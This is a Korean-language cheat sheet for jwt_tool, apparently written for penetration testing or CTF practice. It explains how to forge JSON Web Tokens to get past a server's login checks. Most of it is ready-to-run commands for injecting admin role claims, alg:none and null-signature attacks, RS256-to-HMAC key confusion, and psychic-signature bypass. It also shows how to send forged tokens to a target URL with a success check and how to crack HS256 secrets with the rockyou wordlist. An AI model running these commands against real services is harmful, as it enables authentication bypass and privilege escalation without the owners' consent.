# jwt_tool JWT 변조·알고리즘 공격

- jwt_tool — JWT 토큰을 파싱·검증·변조하고 alg:none, null signature, key confusion 같은 알고리즘 계열 공격과 HS256 시크릿 크래킹을 자동화하는 Python 도구.
- 쿠키·Authorization 헤더에서 eyJ로 시작하는 토큰을 확보했을 때, 클레임(role, sub 등)을 바꿔 서버가 수용하는지 확인할 때, 알고리즘 오용과 약한 시크릿을 점검할 때.
- Python 필요. Kali는 GitHub 저장소 클론 후 실행, Windows는 소스 실행(python jwt_tool.py). 토큰은 반드시 따옴표로 감싼다.

## 기본 명령어 구조

```bash
# Kali (클론 후)
python3 jwt_tool.py "<token>" [옵션]

# Windows 소스 실행
python workspace\web\src-ticarpi-jwt_tool-master\jwt_tool-master\jwt_tool.py "<token>"
```

## 토큰 파싱·검증

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.xxx"
```

- 옵션 없이 실행하면 헤더·페이로드를 디코드해 필드 감사를 돌리고, 토큰을 Token<번호>.txt로 저장하며 이후 재서명·공격 옵션은 이 파일을 기준으로 동작한다.

## 변조 (-T, -I)

```bash
# 프롬프트에서 클레임 값을 하나씩 바꾸고 재서명
python3 jwt_tool.py "<token>" -T -S hs256 -p knownsecret

# 클레임 주입: payload의 role을 admin으로
python3 jwt_tool.py "<token>" -I -pc role -pv admin -S hs256 -p knownsecret
```

- `-T`: 토큰 내용을 대화형으로 변조. 서명 재생성에는 -S(알고리즘)와 -k/-p(시크릿)가 필요하다.
- `-I`: 클레임 주입. -hc/-pc로 대상 클레임, -hv/-pv로 값(파일 지정 가능)을 준다.

## 알고리즘 공격 (-X)

```bash
# a = alg:none, 서명 제거 후 그대로 전송
python3 jwt_tool.py "<token>" -X a

# n = null signature (빈 서명 수용 여부)
python3 jwt_tool.py "<token>" -X n

# k = key confusion, 공개키를 HMAC 시크릿으로 재서명
python3 jwt_tool.py "<token>" -X k -pk public.pem

# p = psychic signature (ECDSA 서명 검증 우회)
python3 jwt_tool.py "<token>" -X p
```

- -X로 변조한 토큰을 서버에 보내려면 -t URL과 함께 -rc(쿠키), -rh(헤더), -pd(POST 데이터)를 붙이고, 성공 판정 문자열은 -cv로 준다.
  python3 jwt_tool.py "<token>" -X a -t "http://10.10.10.10/api/profile" -rc "token=<token>" -cv "Welcome"

## HS256 시크릿 크래킹 (-C)

```bash
# 워드리스트 크랙 / 후보 시크릿 단일 지정(-p)
python3 jwt_tool.py "<token>" -C -d /usr/share/wordlists/rockyou.txt
```

- -C는 HMAC-SHA(hs256/384/512) 토큰의 키를 크랙한다. 성공하면 그 시크릿으로 -S hs256 -p <시크릿> 재서명이 가능해진다.

## 주요 옵션

- `-t`: 변조 토큰을 보낼 대상 URL.
- `-T, -I`: 변조 / 클레임 주입.
- `-X a|n|b|p|s|k|i`: 알고리즘 계열 공격(none, null sig, blank password, psychic, JWKS spoof, key confusion, inline JWKS).
- `-S hs256|rs256|es256...`: 재서명 알고리즘. HMAC은 -p/-k, RSA·EC는 -pr(개인키).
- `-C -d|-p|-kf`: HMAC 키 크랙(워드리스트 / 단일 후보 / keyfile).
- `-cv`: 응답에 이 문자열이 보이면 변조 성공으로 판정.

## 실전 예시

```bash
# 1. 파싱과 필드 감사로 alg·클레임 확인
python3 jwt_tool.py "<token>"
# 2. alg:none 수용 여부를 서버에 바로 확인
python3 jwt_tool.py "<token>" -X a -t "http://10.10.10.10/api" -rc "token=<token>" -cv "admin"
# 3. 시크릿 크랙 성공 후 role 변조 재서명
python3 jwt_tool.py "<token>" -T -S hs256 -p crackedsecret
```

## 팁·트러블슈팅

- 크랙·공격 전에 jwt.io나 base64 디코드로 alg와 클레임 구조를 먼저 파악하면 -X/-S 선택이 빨라진다.
- alg가 RS256인데 서버가 HMAC으로 검증하는 혼동(key confusion)은 -X k -pk public.pem이 정답 경로다.
- 크랙이 실패하면 토큰 자체가 강한 시크릿이거나 RS·ES 서명일 가능성이 높다. 알고리즘 공격(-X)으로 방향을 옮긴다.
